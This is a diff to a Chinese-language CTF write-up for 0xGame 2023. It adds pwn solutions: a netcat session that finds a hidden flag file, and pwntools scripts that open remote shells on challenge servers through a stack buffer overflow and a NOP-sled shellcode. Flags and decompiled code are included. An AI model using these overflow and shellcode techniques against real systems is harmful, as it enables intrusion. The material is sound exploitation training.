@@ -1,14 +1,156 @@
 ---
 title: 0xGame 2023 Writeup
-date: 2023-10-19T19:38:23+08:00
+date: 2023-10-30T19:38:23+08:00
 draft: false
 categories: [CTF]
 tags: [CTF]
 ---
 
-## Week 3
+## Pwn
 
-### all-in-files
+### [Week1] 找不到且不对劲的flag
+
+> 这个黑不溜秋的框框是啥？
+>
+> 这是flag吗？
+>
+> 我flag呢？
+
+根据题目描述，猜测 flag 被藏到了隐藏文件或者隐藏文件夹中。
+
+```bash
+$ nc 8.130.35.16 51000
+$ ls -a
+.
+..
+.bash_logout
+.bashrc
+.profile
+.secret
+bin
+flag
+lib
+lib32
+lib64
+libexec
+libx32
+netcat
+$ ls .secret
+flag
+$ cat .secret/flag
+0xGame{N3t_cA7_M30w_9dn23hcx8}
+
+```
+
+### [Week 1] 永远进不去的后门
+
+> 后门就在那里，但你就是进不去
+>
+> 气不气气不气
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[8]; // [rsp+0h] [rbp-40h] BYREF
+  int v5; // [rsp+8h] [rbp-38h]
+
+  bufinit(argc, argv, envp);
+  puts("Welcome to 0xGame2023!");
+  puts("Tell me sth interesting, and I will give you what you want.");
+  read(0, buf, 0x100uLL);
+  if ( v5 % 2023 == 2023 )
+    system("/bin/sh");
+  else
+    puts("Not that interesting. Bye.");
+  return 0;
+}
+```
+
+read 存在溢出漏洞，直接覆盖掉 ret 地址即可得到 shell。
+
+```python
+from pwn import *
+
+conn = remote("8.130.35.16", 51002)
+conn.recvuntil("want.\n")
+conn.sendline(b"a" * 0x48 + p64(0x401298))
+conn.interactive()
+
+# 0xGame{W3lC0me_4b0rd_PWN_L4nd!_k20cu2c7}
+```
+
+### [Week 1] 随便乱搞的shellcode
+
+> shell壳code码，这怎么就乱搞了？
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  char *buf; // [rsp+8h] [rbp-8h]
+  void (*bufa)(void); // [rsp+8h] [rbp-8h]
+
+  bufinit(argc, argv, envp);
+  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
+  puts("Now show me your code:");
+  read(0, buf, 0x100uLL);
+  puts("Implementing security mechanism...");
+  v3 = time(0LL);
+  srand(v3);
+  bufa = (void (*)(void))&buf[rand() % 256];
+  close(1);
+  puts("Done!");
+  bufa();
+  return 0;
+}
+```
+
+程序会随机执行 buf 中的一条命令，可以把 buf 的前面都填充 `nop` 指令，将 shellcode 放在 buf 的末尾来增加成功执行的概率。
+
+`nop`：空指令（0x90），占用一个指令的时间，但什么都不做，并继续执行接下来的指令。
+
+`str.rjust(width[, fillchar])`：将字符串右对齐到 width 长度，并在左侧填充 fillchar。
+
+因为程序将标准输出流关闭了，所以得到 shell 以后可以执行 `exec 1>&2` 来将默认标准输出流重定向到标准错误流输出。
+
+```python
+from pwn import *
+
+context(os="linux", arch="amd64")
+
+conn = remote("8.130.35.16", 51003)
+conn.recvuntil("code:\n")
+conn.sendline(asm(shellcraft.sh()).rjust(0x100, b"\x90"))
+conn.interactive()
+
+# 0xGame{Try_to_Wr1t3_by_yourse1f!_an9d02cy}
+```
+
+### [Week1] 高端的syscall
+
+> 系统调用是个好东西
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[16]; // [rsp+0h] [rbp-10h] BYREF
+
+  bufinit(argc, argv, envp);
+  puts("I leave something interesting in this program.");
+  puts("Now try to find them out!");
+  puts("Input: ");
+  gets(v4);
+  return 0;
+}
+```
+
+程序开启了 NX 保护并且没有后门函数，可以自己手动构造 syscall 来得到 shell。
+
+一般的程序都会使用到 libc，所以我们可以使用 libc 初始化函数` __libc_csu_init` 中的 gadgets 来修改参数（ret2csu）。
+
+
+
+### [Week3] all-in-files
 
 > 一切皆文件是一种哲学
 
